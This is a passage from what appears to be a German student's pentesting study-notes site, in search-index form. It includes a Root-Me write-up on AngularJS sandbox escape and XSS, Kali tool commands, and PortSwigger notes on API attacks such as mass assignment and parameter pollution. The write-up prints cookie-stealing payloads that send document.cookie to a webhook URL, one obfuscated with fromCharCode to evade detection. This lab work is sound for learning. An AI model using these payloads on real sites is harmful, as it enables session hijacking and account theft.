Admin auf eine eigene Webhook-URL umzuleiten.\u200b</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#was-nicht-funktioniert-hat","title":"\u274c Was nicht funktioniert hat","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#1-direkte-nutzung-von-documentcookie","title":"1. Direkte Nutzung von <code>document.cookie</code>","text":"<ul> <li>Versuch: Einfache Payloads wie:</li> </ul> <pre><code>{{constructor.constructor('document.location=\"https://webhook.site/617db51b-f86d-4a0b-9234-193fadfd4ce4?c=\"+document.cookie')()}}\n</code></pre> <p>und umgewandelt in:</p> <pre><code>http://challenge01.root-me.org/web-client/ch35/index.php?name=%7B%7B%27a%27.constructor.prototype.charAt.constructor%28%27location%3D%22https%3A%2F%2Fwebhook.site%2F617db51b-f86d-4a0b-9234-193fadfd4ce4%3Fc%3D%22%2Bdocument.cookie%27%29%28%29%7D%7D\n</code></pre> <ul> <li> <p>Ergebnis: Keine Fehlermeldung, aber es wurden keine Cookies an den Webhook gesendet.</p> </li> <li> <p>Grund: Die Session-Cookies sind mit dem <code>HttpOnly</code>-Flag versehen, wodurch sie f\u00fcr JavaScript nicht zug\u00e4nglich sind.\u200b</p> </li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#2-selbsttest-im-eigenen-browser","title":"2. Selbsttest im eigenen Browser","text":"<ul> <li> <p>Versuch: Den Payload im eigenen Browser ausf\u00fchren.</p> </li> <li> <p>Ergebnis: Keine Cookies wurden an den Webhook gesendet.</p> </li> <li>Grund: Moderne Browser sch\u00fctzen <code>HttpOnly</code>-Cookies vor JavaScript-Zugriff, selbst wenn der Payload korrekt ist.\u200b</li> </ul>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#was-funktioniert-hat","title":"\u2705 Was funktioniert hat","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#1-verwendung-von-fromcharcode-zur-umgehung-von-filtern","title":"1. Verwendung von <code>fromCharCode</code> zur Umgehung von Filtern","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#schritt-1-deinen-string-in-ascii-codes-umwandeln","title":"\u2728 Schritt 1: Deinen String in ASCII-Codes umwandeln","text":"<p>Der umzuwandelnde String:</p> <p><code>location.href='https://webhook.site/617db51b-f86d-4a0b-9234-193fadfd4ce4?c='+document.cookie</code></p> <p>Hier dein fertiges fromCharCode()-Array: </p><pre><code>108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,54,49,55,100,98,53,49,98,45,102,56,54,100,45,52,97,48,98,45,57,50,51,52,45,49,57,51,102,97,100,102,100,52,99,101,52,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#fertiger-payload","title":"\ud83d\udce6  fertiger Payload:","text":"<pre><code>{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,54,49,55,100,98,53,49,98,45,102,56,54,100,45,52,97,48,98,45,57,50,51,52,45,49,57,51,102,97,100,102,100,52,99,101,52,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))()}}\n</code></pre>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#komplett-fertige-url-zum-absenden-fur-dein-contact-formular","title":"\u2705 Komplett fertige URL zum Absenden (f\u00fcr dein Contact-Formular):","text":"<p>NICHT ENCODED:</p> <pre><code>http://challenge01.root-me.org/web-client/ch35/?name={{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,54,49,55,100,98,53,49,98,45,102,56,54,100,45,52,97,48,98,45,57,50,51,52,45,49,57,51,102,97,100,102,100,52,99,101,52,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))()}}\n</code></pre>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#wichtig","title":"\ud83d\udce3 Wichtig:","text":"<p>\u2705  Webhook <code>https://webhook.site/617db51b-f86d-4a0b-9234-193fadfd4ce4</code> wird angesprochen.</p> <p>\u2705 <code>?c=</code> wird ans Ende geh\u00e4ngt, damit dein Cookie auch ankommt.</p> <p>\u2705 Verschleierung \u00fcber <code>fromCharCode</code>, damit der Adminbot es schwerer hat, den Angriff zu erkennen.</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#sicherheitsmechanismen-in-angularjs","title":"\ud83d\udee1\ufe0f Sicherheitsmechanismen in AngularJS","text":"<p>1. AngularJS-Sandbox</p> <p>AngularJS verwendet eine Sandbox, um den Zugriff auf gef\u00e4hrliche Objekte wie <code>window</code> oder <code>document</code> innerhalb von Template-Ausdr\u00fccken zu verhindern. Diese Sandbox pr\u00fcft Ausdr\u00fccke und blockiert solche, die potenziell sch\u00e4dlich sein k\u00f6nnten. Allerdings wurden im Laufe der Zeit mehrere Methoden entdeckt, um diese Sandbox zu umgehen, insbesondere in \u00e4lteren AngularJS-Versionen. \u200bportswigger.net</p> <p>2. Eingebaute XSS-Schutzmechanismen</p> <p>AngularJS bietet standardm\u00e4\u00dfig Schutzmechanismen gegen XSS-Angriffe. Dazu geh\u00f6rt die automatische Escapierung von Daten, die in Templates eingebunden werden. Allerdings k\u00f6nnen bestimmte Konstruktionen, wie z.B. die direkte Verwendung von <code>innerHTML</code> oder die Nutzung von <code>bypassSecurityTrustHtml()</code>, diese Schutzmechanismen umgehen. \u200bpragmaticwebsecurity.com+1Angular+1</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#umgehung-der-sicherheitsmechanismen","title":"\ud83d\udd0d Umgehung der Sicherheitsmechanismen","text":"<p>Um die Sicherheitsmechanismen zu umgehen, wurde eine Payload verwendet, die den <code>fromCharCode</code>-Ansatz nutzt, um den sch\u00e4dlichen Code zu verschleiern. Dies hilft, einfache Filter zu umgehen, die bestimmte Zeichen oder W\u00f6rter blockieren k\u00f6nnten.</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#fazit","title":"\ud83d\udccc Fazit","text":"<p>Die Sicherheitsmechanismen in AngularJS, wie die Sandbox und automatische Escapierung, bieten einen gewissen Schutz gegen XSS-Angriffe. Allerdings k\u00f6nnen sie durch bestimmte Techniken umgangen werden, insbesondere in \u00e4lteren Versionen oder bei unsachgem\u00e4\u00dfer Verwendung von AngularJS-Funktionen. Es ist daher wichtig, stets die neuesten Sicherheitspraktiken zu befolgen und Anwendungen regelm\u00e4\u00dfig auf Schwachstellen zu \u00fcberpr\u00fcfen.\u200b</p> <p>Wenn du weitere Informationen oder eine detailliertere Analyse ben\u00f6tigst, stehe ich gerne zur Verf\u00fcgung.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Common-Tools/","title":"Common Tools","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Common-Tools/#pentesting-checklist","title":"Pentesting Checklist","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Common-Tools/#kali-tools","title":"Kali-Tools","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Common-Tools/#nmapportscan","title":"Nmap(Portscan)","text":"<pre><code>sudo nmap -sV -p- -oA juiceshopfulltcp -v3 192.168.249.14\n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Common-Tools/#gobusterendpunkte-anzeigen","title":"Gobuster(Endpunkte anzeigen)","text":"<pre><code>gobuster dir -u http://192.168.249.14:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 75055 \n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Common-Tools/#sslyzetls-anzeigen-lassen","title":"Sslyze(TLS anzeigen lassen)","text":"<pre><code>sslyze xxx-xx.xxx.net(Hostname)\n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Common-Tools/#open-source-tool","title":"Open-Source Tool","text":"<p>SwissKy</p> <p>Sammlung von Exploits, Payloads, Cheat Sheets.</p> <p>Cyber-Chef</p> <p>Wof\u00fcr man es nutzt: - dekodieren/encodieren (Base64, hex, URL-encoding, Base32, etc.) - schnelle Kryptotools (XOR, AES/RC4-Dekodierung wenn du den Key hast) - Hashing, Pr\u00fcfsummen, Umwandlung zwischen Formaten (binary\u2194text) - Textanalyse / RegEx / Datenextraktion / CSV/JSON-Manipulation - Forensik/CTF/Prototyping: man baut \u201eRezepte\u201c aus einzelnen Schritten (z. B. From Base64 \u2192 XOR \u2192 UTF-8 Decode).     Typische Szenarien: Log-Analyse, Reverse-engineering von Daten, CTF-Challenges, schnelle Debugging-Hilfen beim Protokollieren/Parsing.</p> <p>Jason Web Token</p> <p>Was es ist: ein einfacher JWT-Debugger/Inspector (JSON Web Tokens). Wof\u00fcr man es nutzt: - Tokenstruktur ansehen (Header.Payload.Signature) - Header und Payload sofort base64url-dekodiert anzeigen - Claims pr\u00fcfen (exp, iat, sub, roles, etc.) - Signatur \u00fcberpr\u00fcfen (wenn du das Geheimnis / den \u00f6ffentlichen Schl\u00fcssel hast) - praktisch zum Debuggen von Auth-Implementierungen     Typische Szenarien: Backend-Entwicklung, Auth-Debugging, Verst\u00e4ndnis/Inspektion von Tokens in APIs oder beim Pentesting (nur legal auf eigenen Systemen).</p> <p>Crackstation</p> <p>Was es ist: ein Online-Service, der bekannte Passwort-Hashes gegen riesige vorgefertigte Tabellen/Listen abgleicht (\u00e4hnlich Rainbow-Table Lookup). Wof\u00fcr man es nutzt: - verlorene/vergessene Passw\u00f6rter wiederherstellen (wenn Hash in ihrer DB vorkommt - pr\u00fcfen, ob ein Passwort leicht in vorgefertigten Listen gefunden werden kann (Sicherheitscheck)     Einschr\u00e4nkungen: funktioniert gut bei kurzen, ungesalzenen Hashes (z. B. MD5, SHA1) und bei h\u00e4ufigen Passw\u00f6rtern - nicht wirksam bei starken, langen oder gesalzenen Hashes. F\u00fcr ernsthaftes Cracking (regelbasiert, GPU, gesalzene Hashes) benutzt man Tools wie hashcat oder John the Ripper (lokal, mit Zustimmung).</p> <p>SSLYZE</p> <p>Was ist es: Ein Online Tool welches checkt ob das genutzte TLS vom Server den Sicherheitsstandards enstpricht. Das Ganze l\u00e4sst sich alternativ manuell ausf\u00fchren mit dem sslyze Befehl von Kali.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/OWASP%20Best%20Practice/","title":"OWASP Best Practice","text":"<p>Best Practice in Web - Security von OWASP. OWASP Best-Practice</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/1.%20API%20Recon/","title":"1. API Recon","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/1.%20API%20Recon/#was-sind-apis","title":"Was sind API's","text":"<ul> <li>Eine API (Application Programming Interface) stellt Funktionen (\u201eMethoden\u201c) bereit, die du \u00fcber definierte URLs (sogenannte Endpoints) aufrufst.</li> <li>Diese Methoden arbeiten nach dem Client\u2013Server-Prinzip:<ul> <li>Du schickst eine Request (mit URL, HTTP-Methode, Parametern).</li> <li>Der Server liefert eine Response zur\u00fcck (meist in JSON oder XML).</li> </ul> </li> </ul> <p>Beispiel: - <code>GET /api/books</code> \u2192 Liste aller B\u00fccher - <code>GET /api/books/42</code> \u2192 Detaildaten zu Buch mit ID 42 - <code>POST /api/books</code> \u2192 Neues Buch anlegen (mit Daten im Request Body) - <code>DELETE /api/books/42</code> \u2192 Buch mit ID 42 l\u00f6schen</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/1.%20API%20Recon/#api-recon","title":"API - Recon","text":"<p>Bedeutet, Infos \u00fcber die API zu sammeln, um ihre Angriffsfl\u00e4che zu verstehen</p> <ol> <li>Endpoints finden -&gt; zB <code>/api/books</code>, <code>/api/books/mystery</code><ol> <li>Jeder Endpoint steht f\u00fcr einen bestimmten Zugriff auf Ressourcen <pre><code>GET /api/books HTTP/1.1 \nHost: example.com\n</code></pre></li> </ol> </li> <li>Interaktionen verstehen -&gt; Welche Requests sind m\u00f6glich?<ul> <li>Welche Parameter (Pflicht &amp; Optional) verarbeitet die API?</li> <li>Welche HTTP-Methoden (GET, POST, PUT, DELETE) und Formate (JSON, XML) werden unterst\u00fctzt</li> <li>Gibt es Rate Limits oder Authentifizierungen (API-Keys, Tokens, OAuth)</li> </ul> </li> </ol> <p>API Dokumentation API's sind meisens ausf\u00fchrlich dokumentiert wie diese zu nutzen sind f\u00fcr Developer, API Keys sind meist \u00f6ffentlich - der beste Anfang f\u00fcr ein API Recon ist sich mit der Dokumentation auseinanderzusetzen</p> <p>API-Dokumentation entdecken - Auch wenn keine offene Doku vorhanden ist, kannst du sie \u00fcber die Anwendung finden, die die API nutzt. - Tools/Methoden:     - Mit Burp Scanner die Anwendung crawlen.     - Manuell mit Burp Browser nach Hinweisen suchen.</p> <p>[!tip]- Crawler: Wie eine Art Bot der alle Links, Buttons und Formularaktionen einer Webseite nacheinander anklickt!</p> <ul> <li> <p>Typische Pfade f\u00fcr API-Doku:</p> <ul> <li><code>/api</code></li> <li><code>/swagger/index.html</code></li> <li><code>/openapi.json</code></li> </ul> </li> <li> <p>Tipp: Wenn du einen konkreten Endpoint findest (z. B. <code>/api/swagger/v1/users/123</code>), pr\u00fcfe auch die \u00fcbergeordneten Pfade:</p> <ul> <li><code>/api/swagger/v1</code></li> <li><code>/api/swagger</code></li> <li><code>/api</code></li> </ul> </li> <li> <p>Mit Intruder + Wortlisten kannst du nach h\u00e4ufigen Doku-Pfaden suchen.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/1.%20API%20Recon/#lab-exploiting-an-api-endpoint-using-documentation","title":"Lab: Exploiting an API endpoint using documentation","text":"<ol> <li>Erstmal schauen ob wir irgendwelche API verkn\u00fcpfungen finden in userer HTTP Historie. </li> <li>Wir haben eine beim updaten der E-Mail gefunden</li> <li>Wir testen bisschen rum mit den Links im Burp-Repeater (Pfade k\u00f6nnen aber auch im Burp Scanner gescannt werden) -&gt; unter <code>/api</code> haben wir die API Dokumentation gefunden.</li> <li>Wir nutzen diese Doku und schicken unseren eigenen Befehl \u00fcber den <code>Update-Email</code> Request mit einem angepassten Parameter</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/2.%20Identifizieren%20und%20Interagieren%20mit%20API/","title":"2. Identifizieren und Interagieren mit API","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/2.%20Identifizieren%20und%20Interagieren%20mit%20API/#wie-identifiziert-man-api-endpunkte","title":"Wie identifiziert man API Endpunkte","text":"<ul> <li>Man kann schon viele Infos sammeln indem man nur einfach die Anwendung durchst\u00f6bert<ul> <li>Selbst wenn es eine Dokumentation gibt lohnt sich das weil diese manchmal einfach veraltet sind</li> </ul> </li> <li>Mit dem Burp Scanner kann man Anwendungen crawlen und anschlie\u00dfend manuell durchst\u00f6bern</li> <li>Muster wie <code>/api/</code> k\u00f6nnten Auskunft \u00fcber die Dokumentation liefern</li> <li>Javascript Dateien enthalten oft Referenzen auf API Endpoints die im Browser gar nicht direkt ausgel\u00f6st werden<ul> <li>Burp Scanner extrahiert automatisch einige Endpoints beim crawlen</li> <li>F\u00fcr eine tiefere Ektraktion kann man mit JS Link Finder BApp benutzen</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/2.%20Identifizieren%20und%20Interagieren%20mit%20API/#interaktion-mit-api-endpoints","title":"Interaktion mit API-Endpoints","text":"<ul> <li>Mit Repeater oder Intruder</li> <li>API testen - HTTP Methoden oder Medientyp \u00e4ndern und schauen wie es reagiert</li> <li>Fehlermeldungen genau pr\u00fcfen weil enthalten oft Infos</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/2.%20Identifizieren%20und%20Interagieren%20mit%20API/#unterstutzte-http-methoden-identifizieren","title":"Unterst\u00fctzte HTTP-Methoden identifizieren","text":"<p>Die HTTP-Methode gibt an, welche Aktion auf einer Ressource ausgef\u00fchrt wird. Beispiele: - <code>GET</code> -&gt; Ruft Daten ab - <code>PATCH</code> -&gt; \u00c4ndert Daten teilweise - <code>OPTIONS</code> -&gt; Liefert Informationen dar\u00fcber, welche Methoden erlaubt sind </p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/2.%20Identifizieren%20und%20Interagieren%20mit%20API/#unterstutzte-content-types-identifizieren","title":"Unterst\u00fctzte Content-Types identifizieren","text":"<ul> <li>API-Endpoints erwarten oft Daten in einem bestimmten Format.</li> <li>Je nach Content-Type kann sich das Verhalten der API \u00e4ndern.</li> <li> <p>Durch \u00c4ndern des Content-Types kannst du z. B.:</p> <ul> <li>Fehler provozieren, die n\u00fctzliche Infos preisgeben.</li> <li>Schwache Abwehrmechanismen umgehen.</li> <li>Unterschiede in der Verarbeitungslogik ausnutzen.<ul> <li>Beispiel: JSON-Verarbeitung ist sicher, aber XML-Verarbeitung erlaubt Injections.</li> </ul> </li> </ul> </li> <li> <p>Vorgehen:</p> <ul> <li>Im Content-Type-Header den Typ \u00e4ndern.</li> <li>Den Request-Body passend dazu umformatieren.</li> </ul> </li> <li> <p>Mit dem Content Type Converter BApp kannst du Daten automatisch zwischen XML und JSON konvertieren.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/2.%20Identifizieren%20und%20Interagieren%20mit%20API/#lab-finding-and-exploiting-an-unused-api-endpoint","title":"Lab: Finding and exploiting an unused API endpoint","text":"<p>!!Nachtr\u00e4glich dokumentieren!!</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/2.%20Identifizieren%20und%20Interagieren%20mit%20API/#using-intruder-to-find-hidden-endpoints","title":"Using Intruder to find hidden endpoints","text":"<p>Wir k\u00f6nnen den Intruder nutzen und eigene Payloads draufladen um PATHS zu bruteforcen - z. B. mit mehreren Wordlisten bzw. HTTP Befehlen </p><pre><code>\u00a7PATCH\u00a7 /\u00a7api\u00a7/\u00a7products\u00a7/\u00a71\u00a7/\u00a7price\u00a7 HTTP/2\nHost: 0ad300850399877881047ffd00e70095.web-security-academy.net\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/2.%20Identifizieren%20und%20Interagieren%20mit%20API/#finding-hidding-parameters","title":"Finding hidding parameters","text":"<p>Um tiefer in der API zu suchen kann man den Inhalt der Endpunkte mit Tools abchecken - manchmal gibt es undokumentierte Parameter die, die API trotzdem nutzen kann.</p> <ul> <li> <p>Burp Intruder</p> <ul> <li>Kann mit einer Wordlist g\u00e4ngiger Parameternamen systematisch Parameter testen.</li> </ul> </li> <li> <p>Param Miner BApp</p> <ul> <li>Err\u00e4t automatisch bis zu 65.536 Parameternamen pro Request.</li> </ul> </li> <li> <p>Content Discovery Tool</p> <ul> <li>Deckt Inhalte auf, die nicht direkt verlinkt sind.</li> <li>Hilft ebenfalls beim Aufsp\u00fcren versteckter Parameter.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/2.%20Identifizieren%20und%20Interagieren%20mit%20API/#mass-assignment-vulnerabilities","title":"Mass assignment vulnerabilities","text":"<p>Mass assignment bedeutet, dass die Entwickler den Namen \u00e4ndern lassen wollten, aber man kann verschiedene zus\u00e4tzliche Parameter mitschicken falls es die gibt, weil nicht validiert wird.</p> <p>Beispiel: <code>GET /api/users/123</code></p> <p>Antwort: </p><pre><code>{\n  \"id\": 123,\n  \"username\": \"wiener\",\n  \"email\": \"wiener@example.com\",\n  \"isAdmin\": false,\n  \"credits\": 5000\n}\n</code></pre><p></p> <p>Offiziell darf man z. B. nur <code>username</code> und <code>email</code> \u00e4ndern. Aber wenn man einen PATCH baut wie:</p> <pre><code>{\n  \"username\": \"wiener2\",\n  \"isAdmin\": true,\n  \"credits\": 999999\n}\n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/2.%20Identifizieren%20und%20Interagieren%20mit%20API/#lab-exploiting-a-mass-assignment-vulnerability","title":"Lab: Exploiting a mass assignment vulnerability","text":"<ol> <li>Wir rufen erstmal ganz viele Methoden und Funktionen auf und analysieren hinterher was uns der Server so sagt - Wir sehen ein<ul> <li>POST Request mit API URL</li> <li>GET Request mit API URL </li> </ul> </li> </ol> <p> 2. Wir passen dann den POST Request an - hier haben wir item_price auf 0 gesetzt, aber alternativ w\u00fcrde sich auch der discount auf 100% setzen lassen. Ab da hat man freien Spielraum </p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/3.%20Preventing%20API%20Vulnerabilities/","title":"3. Preventing API Vulnerabilities","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/3.%20Preventing%20API%20Vulnerabilities/#wie-verhindert-man-api-schwachstellen","title":"Wie verhindert man API Schwachstellen","text":"<p>Best-Practice - Dokumentation absichern wenn kein Bedarf besteht es \u00f6ffentlich zugriffbar zu machen - Dokumentation aktuell halten damit Tester sehen welche Angriffsfl\u00e4chen die Webseite hat - Eine Art Whitelist f\u00fcr HTTP Methoden - Content-Typ pr\u00fcfen - Anfragen und Antworten m\u00fcssen erwartetes Format haben - Generische Fehlermeldungen verwenden damit keine unn\u00f6tigen Infos preisgegeben werden - Alle Versionen der API sch\u00fctzen - nicht nur die aktuelle Produktionsversion - Mass Alignment verhindern:     - Allowlist f\u00fcr Felder, die User \u00e4ndern d\u00fcrfen     - Blocklist f\u00fcr sensible Felder, die niemals durch den user ge\u00e4ndert werden d\u00fcrfen</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/","title":"4. Server Side Parameter Pollution(SSPP)","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#server-side-parameter-pollutionsspp","title":"Server-Side Parameter Pollution(SSPP)","text":"<p>Manche Systeme haben interne API's die nicht \u00f6ffentlich erreichbar sind -  Problem: Eine Webseite nimmt User Input, aber verarbeitet diesen intern und im Zweifel kann ein Angreifer eigene Parameter einschleusen (Parameter Pollution)</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#mogliche-auswirkungen","title":"M\u00f6gliche Auswirkungen","text":"<ul> <li>Vorhandene Parameter \u00fcberschreiben.</li> <li>Verhalten der Anwendung manipulieren.</li> <li>Unberechtigten Zugriff auf Daten erhalten.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#wo-kann-das-passieren","title":"Wo kann das passieren?","text":"<p>Alles, was User Input enth\u00e4lt, k\u00f6nnte anf\u00e4llig sein: - Query-Parameter (<code>?id=123&amp;role=user</code>) - Form-Felder - HTTP-Header - URL-Pfade</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#query-strings","title":"Query strings","text":"<p>Nehmen wir an, die Anwendung baut serverseitig einen API-Request:</p> <p><code>/internal-api/getUser?id=123</code></p> <p>Der User darf eigentlich nur die <code>id</code> beeinflussen. Aber der Angreifer gibt als Input ein:</p> <pre><code>123&amp;isAdmin=true\n</code></pre> <p>Der Server baut dann:</p> <pre><code>/internal-api/getUser?id=123&amp;isAdmin=true\n</code></pre> <p>Der Server leitet das intern dann weiter an die API</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#query-strings-abschneidentruncating","title":"Query Strings abschneiden(Truncating) <code>#</code>","text":"<p>Man kann serverseitige Anfragen abschneiden indem man ein URL-kodiertes <code>#</code> einf\u00fcgt. Also :<code>%23</code></p> <p>Beispiel: <code>GET /userSearch?name=peter%23foo&amp;back=/home</code></p> <p>Daraus wird intern:</p> <p><code>GET /users/search?name=peter#foo&amp;publicProfile=true</code></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#ungultige-parameter-einschleusen","title":"Ung\u00fcltige Parameter einschleusen <code>&amp;</code>","text":"<p>Mit <code>&amp;</code> URL-kodiert <code>%26</code> kannn man neue Parameter injizieren</p> <pre><code>GET /userSearch?name=peter%26foo=xyz&amp;back=/home\n</code></pre> <pre><code>GET /users/search?name=peter&amp;foo=xyz&amp;publicProfile=true\n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#vorhandene-parameter-uberschreiben","title":"### Vorhandene Parameter \u00fcberschreiben <code>&amp;</code>","text":"<p>Um sicher zu best\u00e4tigen, dass die Anwendung anf\u00e4llig ist, versuche einen bereits vorhandenen Parameter zu \u00fcberschreiben, indem du denselben Namen zweimal sendest.</p> <p>Beispiel:</p> <p><code>GET /userSearch?name=peter%26name=carlos&amp;back=/home</code></p> <p>Intern:</p> <p><code>GET /users/search?name=peter&amp;name=carlos&amp;publicProfile=true</code></p> <p>Wie das interpretiert wird, h\u00e4ngt von der Technologie ab:</p> <ul> <li>PHP \u2192 letzter Parameter z\u00e4hlt \u2192 Suche nach <code>carlos</code>.</li> <li>ASP.NET \u2192 kombiniert beide \u2192 Suche nach <code>peter,carlos</code> \u2192 evtl. Fehler Invalid username.</li> <li>Node.js / Express \u2192 erster Parameter z\u00e4hlt \u2192 Suche nach <code>peter</code>.</li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#lab-exploiting-server-side-parameter-pollution-in-a-query-string","title":"Lab: Exploiting server-side parameter pollution in a query string","text":"<p>!!! Nachtr\u00e4glich !!!</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#testing-for-server-side-parameter-pollution-in-rest-paths","title":"Testing for server-side parameter pollution in REST paths","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#parameter-in-der-url-pfad-struktur","title":"Parameter in der URL-Pfad-Struktur","text":"<p>Bei einer RESTful API k\u00f6nnen Parameter nicht nur im Query String, sondern auch direkt im URL-Pfad stehen.</p> <p>Beispiel: <code>/api/users/123</code> - <code>/api</code> \u2192 Root-Endpoint - <code>/users</code> \u2192 Ressource - <code>/123</code> \u2192 Parameter (z. B. User-ID)</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#beispiel-szenario","title":"Beispiel-Szenario","text":"<p>Die Anwendung erlaubt das Bearbeiten von Profilen \u00fcber: <code>GET /edit_profile.php?name=peter</code></p> <p>Intern macht der Server daraus: <code>GET /api/private/users/peter</code></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#angriffsmoglichkeit","title":"Angriffsm\u00f6glichkeit","text":"<p>Ein Angreifer k\u00f6nnte den Parameter so manipulieren, dass er Pfad-Traversal-Sequenzen einschleust.</p> <p>Beispiel: <code>GET /edit_profile.php?name=peter%2f..%2fadmin</code></p> <p>Das f\u00fchrt intern zu: <code>GET /api/private/users/peter/../admin</code></p> <p>Wenn die API oder der Server diesen Pfad normalisiert, wird daraus: <code>/api/private/users/admin</code></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#testing-for-server-side-parameter-pollution-in-structured-data-formats","title":"Testing for Server-side Parameter Pollution in Structured Data Formats","text":"<p>Ein Angreifer kann versuchen, Parameter in strukturierten Datenformaten wie JSON oder XML einzuschleusen. Ziel: Schwachstellen in der Verarbeitung auf der Serverseite ausnutzen. Kurz gesagt: Wenn User-Input ungefiltert in JSON/XML \u00fcbernommen wird, dann kann der Angreifer zus\u00e4tzliche Parameter einschleusen insofern diese vom Server verarbeitet werden k\u00f6nnen</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/API-Testing/4.%20Server-Side%20Parameter%20Pollution%28SSPP%29/#beispiel-1-formulardaten-json-auf-serverseite","title":"Beispiel 1 \u2013 Formulardaten \u2192 JSON auf Serverseite","text":"<p>Client-Request: <code>POST /myaccount name=peter</code></p> <p>Server-Request: <code>PATCH /users/7312/update {\"name\":\"peter\"}</code></p> <p>Angreifer manipuliert die Eingabe: <code>POST /myaccount name=peter\",\"access_level\":\"administrator</code></p> <p>Server \u00fcbernimmt das ungefiltert \u2192 daraus wird: 